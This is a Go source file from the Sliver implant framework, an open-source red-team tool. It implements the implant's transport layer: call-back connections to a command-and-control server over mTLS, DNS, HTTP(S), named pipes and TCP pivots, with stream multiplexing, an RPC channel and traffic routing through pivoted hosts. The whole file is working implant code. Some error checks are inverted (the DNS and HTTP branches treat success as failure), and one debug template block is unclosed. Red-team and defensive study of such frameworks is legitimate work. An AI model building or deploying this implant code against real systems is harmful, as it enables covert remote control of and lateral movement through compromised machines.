package transports

/*
	Sliver Implant Framework
	Copyright (C) 2019  Bishop Fox

	This program is free software: you can redistribute it and/or modify
	it under the terms of the GNU General Public License as published by
	the Free Software Foundation, either version 3 of the License, or
	(at your option) any later version.

	This program is distributed in the hope that it will be useful,
	but WITHOUT ANY WARRANTY; without even the implied warranty of
	MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
	GNU General Public License for more details.

	You should have received a copy of the GNU General Public License
	along with this program.  If not, see <https://www.gnu.org/licenses/>.
*/

import (
	// {{if .Config.Debug}}
	"log"
	// {{end}}
	"errors"
	"fmt"
	"io"
	"net"
	"net/url"
	"strconv"
	"sync"
	"time"

	pb "github.com/bishopfox/sliver/protobuf/sliverpb"
	"github.com/bishopfox/sliver/sliver/3rdparty/hashicorp/yamux"
	"github.com/bishopfox/sliver/sliver/3rdparty/ilgooz/bon"
)

// Transport - A wrapper around a physical connection, embedding what is necessary to perform
// connection multiplexing, and RPC layer management around these muxed logical streams.
// This allows to have different RPC-able streams for parallel work on an implant.
// Also, these multiplexed streams can be used to route any net.Conn traffic.
// Some transports use an underlying "physical connection" that is not/does not yield a
// net.Conn stream, and are therefore unable to use much of the Transport infrastructure.
type Transport struct {
	ID uint64

	// URL is used by Sliver's code for CC servers.
	URL *url.URL

	// If the underlying connection is not a net.Conn, we cannot multiplex it.
	IsMux bool

	// conn - A physical connection initiated by/on behalf of this transport.
	// From this conn will be derived one or more streams for different purposes.
	// Sometimes this conn is not a proper physical connection (like yielded by net.Dial)
	// but it nonetheless plays the same role. This conn can be nil if the underlying
	// "physical connection" does not yield a net.Conn.
	Conn net.Conn

	// Multiplexer - Able to derive stream from the physical conn above.
	Multiplexer *yamux.Session

	// The RPC layer added around a net.Conn stream, used by implant to talk with the server.
	// It is either setup on top of physical conn, or of a muxed stream.
	// It can be nil if the Transport is tied to a pivoted implant.
	// If the Transport is the ActiveConnection to the C2 server, this cannot
	// be nil, as all underlying transports allow to register a RPC layer.
	C2 *Connection

	// Router - For each connection that needs to be forwarded to the Transport's other end,
	// we use the Router to connect, specify the wished route of the connection, and pipe.
	// Therefore, here the Router is in a client position most of the time.
	Router *bon.Bon
}

// NewTransport - Eventually, we should have all supported transport transports being
// instantiated with this function. It will perform all filtering and setup
// according to the complete URI passed as parameter, and classic templating.
func NewTransport(url *url.URL) (t *Transport, err error) {
	t = &Transport{
		ID:  newID(),
		URL: url,
	}
	// {{if .Config.Debug}}
	log.Printf("New transport (CC= %s)", url.String())
	// {{end}}
	return
}

// Start - Launch all components and routines that will handle all specifications above.
func (t *Transport) Start() (err error) {

	connectionAttempts := 0

ConnLoop:
	for connectionAttempts < maxErrors {

		// We might have several transport protocols available, while some
		// of which being unable to do stream multiplexing (ex: mTLS + DNS):
		// we directly set up the C2 RPC layer here when needed, and we will
		// skip the mux part below if needed.
		switch t.URL.Scheme {
		// {{if .Config.MTLSc2Enabled}}
		case "mtls":
			// {{if .Config.Debug}}
			log.Printf("Connecting -> %s", t.URL.Host)
			// {{end}}
			lport, err := strconv.Atoi(t.URL.Port())
			if err != nil {
				// {{if .Config.Debug}}
				log.Printf("[mtls] Error: failed to parse url.Port%s", t.URL.Host)
				// {{end}}
				lport = 8888
			}
			t.Conn, err = tlsConnect(t.URL.Hostname(), uint16(lport))
			if err != nil {
				// {{if .Config.Debug}}
				log.Printf("[mtls] Connection failed %s", err)
				// {{end}}
				connectionAttempts++
			}
			t.IsMux = true
			break ConnLoop
			// {{end}} - MTLSc2Enabled
		case "dns":
			// {{if .Config.DNSc2Enabled}}
			t.C2, err = dnsConnect(t.URL)
			if err == nil {
				// {{if .Config.Debug}}
				log.Printf("[dns] Connection failed %s", err)
				// {{end}}
				connectionAttempts++
			}
			t.IsMux = false
			break ConnLoop
			// {{end}} - DNSc2Enabled
		case "https":
			fallthrough
		case "http":
			// {{if .Config.HTTPc2Enabled}}
			t.C2, err = httpConnect(t.URL)
			if err == nil {
				// {{if .Config.Debug}}
				log.Printf("[%s] Connection failed %s", t.URL.Scheme, err)
				// {{end}}
				connectionAttempts++
			}
			t.IsMux = false
			break ConnLoop
			// {{end}} - HTTPc2Enabled
		case "namedpipe":
			// {{if .Config.NamePipec2Enabled}}
			t.Conn, err = namePipeDial(t.URL)
			if err != nil {
				// {{if .Config.Debug}}
				log.Printf("[namedpipe] Connection failed %s", err)
				// {{end}}
				connectionAttempts++
			}
			t.IsMux = true
			break ConnLoop
			// {{end}} -NamePipec2Enabled
		case "tcppivot":
			// {{if .Config.TCPPivotc2Enabled}}
			t.C2, err = tcpPivotConnect(t.URL)
			if err != nil {
				// {{if .Config.Debug}}
				log.Printf("[tcppivot] Connection failed %s", err)
				// {{end}}
				connectionAttempts++
			}
			t.IsMux = false // For the moment...
			break ConnLoop
			// {{end}} -TCPPivotc2Enabled
		default:
			err = fmt.Errorf("Unknown c2 protocol %s", t.URL.Scheme)
			// {{if .Config.Debug}}
			log.Printf(err.Error())
			// {{end}}
			return
		}
	}

	// If the underlying protocol stack allows us to do stream mux, set it up.
	// If not, all C2 RPC layer is already set for this transport.
	if t.IsMux {
		// The C2 server is here the yamux.Client requiring to open a session.
		t.Multiplexer, err = yamux.Server(t.Conn, nil)
		if err != nil {
			// {{if .Config.Debug}}
			log.Printf("[mux] Error setting up Multiplexer server: %s", err)
			// {{end}}
			t.phyConnFallBack()
		} else {
			// If everything is fine, setup RPC C2 code over a muxed stream.
			// This function handles all errors and edge cases.
			t.setupMuxC2()
		}
	}

	// Everything in the transport is set up and running, including RPC layer.
	// We now either send a registration envelope, or anything.
	activeConnection = t.C2
	activeC2 = t.URL.String()

	// {{if .Config.Debug}}
	log.Printf("Transport %d set up and running (%s)", t.ID, t.URL)
	// {{end}}
	return
}

// StartMuxPivot - Given a physical connection as parameter, we setup multiplexing,
func (t *Transport) StartMuxPivot(conn net.Conn, routeID uint32) (err error) {

	t.Conn = conn

	// Setup multiplexing first, and return if any error.
	// The implant here acts as the C2 server.
	t.Multiplexer, err = yamux.Client(t.Conn, nil)
	if err != nil {
		// {{if .Config.Debug}}
		log.Printf("[mux] Error setting up (pivot) multiplexer client: %s", err)
		// {{end}}
		return
	}
	// {{if .Config.Debug}}
	log.Printf("Transport %d set up and running (%s <- %s)", t.ID, t.Conn.LocalAddr(), t.Conn.RemoteAddr())
	// {{end}}

	// The first stream is the pivoted implant registering and speaking RPC.
	go t.handleReverseC2(routeID)

	return
}

// HandleReverseC2 - The transport's other end is a pivoted implant, and we
// handle the first stream over which the pivoted implant will speak RPC.
// This function will probably be rewritten, given that transports will have to handle
// various types of traffic like UDP connections, and that routing will have to be efficient
// for those as well.
func (t *Transport) handleReverseC2(routeID uint32) (err error) {
	// As the server is a client when setting up C2 RPC stream, we act as the server
	// and request to open a stream. The pivoted implant is listening for this.
	src, err := t.Multiplexer.Open()
	if err != nil {
		// {{if .Config.Debug}}
		log.Printf("[mux] Error opening C2 stream: %s", err)
		// {{end}}
		return
	}

	// Connect back with the route ID provided and route the connection.
	var route bon.Route = bon.Route(routeID)

	dst, err := ServerComms.Router.Connect(route)
	if err != nil {
		// {{if .Config.Debug}}
		log.Printf("[route] Error connecting to next node: %s", err.Error())
		// {{end}}
		return
	}
	// {{if .Config.Debug}}
	log.Printf("[mux] Outbound stream: muxing conn and piping")
	// {{end}}

	transport(src, dst) // Pipe connection

	return
}

// setupMuxC2 - The transport waits for the server to mux the first stream and handles any error.
func (t *Transport) setupMuxC2() (err error) {
	// We wait for the first stream being instantiated over the connection
	// and add the RPC layer to it. If an error arises or if we timeout, we
	// fall back to wrapping the RPC around the transport's physical conn.
	var inbound = make(chan net.Conn, 1)
	var timedOut = make(chan struct{}, 1)
	go func(timedOut chan struct{}) {
		select {
		default:
			// {{if .Config.Debug}}
			log.Printf("[mux] Waiting for CC to open C2 stream...")
			// {{end}}
			stream, _ := t.Multiplexer.Accept()
			inbound <- stream
			return
		case <-timedOut:
			return
		}
	}(timedOut)

	select {
	case stream := <-inbound:
		t.C2, err = t.setupSessionRPC(stream)
		if err != nil {
			// {{if .Config.Debug}}
			log.Printf("Error: setting RPC C2: %s", err)
			err = t.phyConnFallBack()
		}
	case <-time.After(defaultNetTimeout):
		close(timedOut)
		close(inbound)
		// {{if .Config.Debug}}
		log.Printf("[mux] timed out waiting muxed stream for RPC C2 layer")
		// {{end}}
		t.phyConnFallBack()
	}

	return
}

// setupSessionRPC - Adds the RPC layer to the Transport, so that implant can talk to C2 server.
// The stream parameter is not "tracked" or "registered" by ourselves, but we should need to.
func (t *Transport) setupSessionRPC(stream net.Conn) (c2 *Connection, err error) {

	if stream == nil {
		return nil, errors.New("Attempted to setup RPC layer around nil net.Conn")
	}

	c2 = &Connection{
		Send:    make(chan *pb.Envelope),
		Recv:    make(chan *pb.Envelope),
		ctrl:    make(chan bool),
		tunnels: &map[uint64]*Tunnel{},
		mutex:   &sync.RWMutex{},
		once:    &sync.Once{},
		IsOpen:  true,
		cleanup: func() {
			// {{if .Config.Debug}}
			log.Printf("[RPC] lost connection/stream, cleaning up RPC...")
			// {{end}}
			close(c2.Send)
			close(c2.Recv)
			// In sliver we close the physical conn.
			// Here we close the logical stream only.
			stream.Close()
		},
	}

	go func() {
		defer c2.Cleanup()
		for envelope := range c2.Send {
			connWriteEnvelope(stream, envelope)
		}
	}()

	go func() {
		defer c2.Cleanup()
		for {
			envelope, err := connReadEnvelope(stream)
			if err == io.EOF {
				break
			}
			if err == nil {
				c2.Recv <- envelope
			}
		}
	}()

	// {{if .Config.Debug}}
	log.Printf("Done creating RPC C2 stream.")
	// {{end}}

	return
}

// In case we failed to use multiplexing infrastructure, we call here
// to downgrade to RPC over the transport's physical connection.
func (t *Transport) phyConnFallBack() (err error) {

	// {{if .Config.Debug}}
	log.Printf("[mux] falling back on RPC around physical conn")
	// {{end}}

	// First make sure all mux code is cleanup correctly.
	if t.Multiplexer != nil {
		err = t.Multiplexer.GoAway()
		if err != nil {
			// {{if .Config.Debug}}
			log.Printf("[mux] Error sending GoAway: %s", err)
			// {{end}}
		}

		err = t.Multiplexer.Close()
		// {{if .Config.Debug}}
		log.Printf("[mux] Error closing session: %s", err)
		// {{end}}

		t.IsMux = false
	}

	// Wrap RPC layer around physical conn.
	t.C2, err = t.setupSessionRPC(t.Conn)

	return
}

// Stop - Gracefully shutdowns all components of this transport. The force parameter is used in case
// we have a mux transport, and that we want to kill it even if there are pending streams in it.
func (t *Transport) Stop(force bool) (err error) {

	if t.IsMux {
		if t.IsRouting() && !force {
			return fmt.Errorf("Cannot stop transport: %d streams still opened", t.Multiplexer.NumStreams())
		}

		// {{if .Config.Debug}}
		log.Printf("[mux] closing all muxed streams")
		// {{end}}

		err = t.Multiplexer.GoAway()
		if err != nil {
			// {{if .Config.Debug}}
			log.Printf("[mux] Error sending GoAway: %s", err)
			// {{end}}
		}

		err = t.Multiplexer.Close()
		// {{if .Config.Debug}}
		log.Printf("[mux] Error closing session: %s", err)
		// {{end}}
	}

	// Just check the physical connection is not nil and kill it if necessary.
	if t.Conn != nil {
		// {{if .Config.Debug}}
		log.Printf("killing physical connection (%s  ->  %s", t.Conn.LocalAddr(), t.Conn.RemoteAddr())
		// {{end}}
		return t.Conn.Close()
	}

	// {{if .Config.Debug}}
	log.Printf("Transport closed (%s)", activeC2)
	// {{end}}
	return
}

// HandleRouteConn - The transport is asked to route a stream given a route parameter.
// It determines the position of the implant in the route nodes, and depending on this,
// it either pipes the connection  through another transport (a pivoted implant), or it
// directly dials hosts on the implant's host subnet.
func (t *Transport) HandleRouteConn(route *pb.Route, src net.Conn) error {

	// {{if .Config.Debug}}
	log.Printf("[route] routing connection (ID: %d, Dest: %s)", route.ID, src.RemoteAddr())
	// {{end}}

	var routeID bon.Route = bon.Route(route.ID)

	// If we are the last node in the chain, we directly
	// dial other hosts on this implant's host subnet.
	if len(route.Nodes) == 1 {

	} else if len(route.Nodes) > 1 {
		// We find the transport connected to next node in chain, and give it the conn to be handled.
		for _, t := range Transports.Active {
			next := route.Nodes[1]
			if t.URL.String() == next.Addr { // Change this, not reliable way to find the good transport.

				dst, err := t.Router.Connect(routeID)
				if err != nil {
					// {{if .Config.Debug}}
					log.Printf("[route] Error connecting to next node: %s", err.Error())
					// {{end}}
					return err
				}

				// {{if .Config.Debug}}
				log.Printf("[mux] Outbound stream: muxing conn and piping")
				// {{end}}

				transport(src, dst) // Pipe connection
			}
		}
	}

	return nil
}

// IsRouting - The transport checks if it is routing traffic that does not originate from this implant.
func (t *Transport) IsRouting() bool {

	if t.IsMux {
		activeStreams := t.Multiplexer.NumStreams()
		// If there is an active C2, there is at least one open stream,
		// that we do not count as "important" when stopping the Transport.
		if (t.C2 != nil && activeStreams > 1) || (t.C2 == nil && activeStreams > 0) {
			return true
		}
		// Else we don't have any non-implant streams.
		return false
	}
	// If no mux, no routing.
	return false
}

func transport(rw1, rw2 io.ReadWriter) error {
	errc := make(chan error, 1)
	go func() {
		errc <- copyBuffer(rw1, rw2)
	}()

	go func() {
		errc <- copyBuffer(rw2, rw1)
	}()

	err := <-errc
	if err != nil && err == io.EOF {
		err = nil
	}
	return err
}

func copyBuffer(dst io.Writer, src io.Reader) error {
	buf := lPool.Get().([]byte)
	defer lPool.Put(buf)

	_, err := io.CopyBuffer(dst, src, buf)
	return err
}

var (
	sPool = sync.Pool{
		New: func() interface{} {
			return make([]byte, smallBufferSize)
		},
	}
	mPool = sync.Pool{
		New: func() interface{} {
			return make([]byte, mediumBufferSize)
		},
	}
	lPool = sync.Pool{
		New: func() interface{} {
			return make([]byte, largeBufferSize)
		},
	}
)

var (
	tinyBufferSize   = 512
	smallBufferSize  = 2 * 1024  // 2KB small buffer
	mediumBufferSize = 8 * 1024  // 8KB medium buffer
	largeBufferSize  = 32 * 1024 // 32KB large buffer
)
